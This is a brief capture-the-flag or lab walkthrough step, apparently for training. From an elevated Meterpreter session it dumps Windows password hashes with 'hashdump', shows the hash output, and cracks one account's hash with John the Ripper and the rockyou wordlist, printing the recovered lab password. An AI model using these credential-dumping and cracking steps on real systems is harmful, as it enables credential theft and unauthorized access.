5.1 Crack passwords


Dump the non-default user's password and crack it!


a) Within our elevated “meterpreter shell”, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so.

meterpreter > hashdump


Output:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


This contains "user' account information and looks as follows:

Each field is separated with colon. The fields are:
1. username(Administrator, User1, etc.)
2. Relative Identification (RID):last 3-4 digits of the Security Identifier (SID), which are unique to each user.
3. LM hash
4. NTLM hash

b) Save the file as “hashes.txt” to your Kali Linux Attack System.

$gedit hashes.txt


c) Crack the passwords with “John the Ripper”.

$john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 


Output:


Username: Dark
Password: Password01!
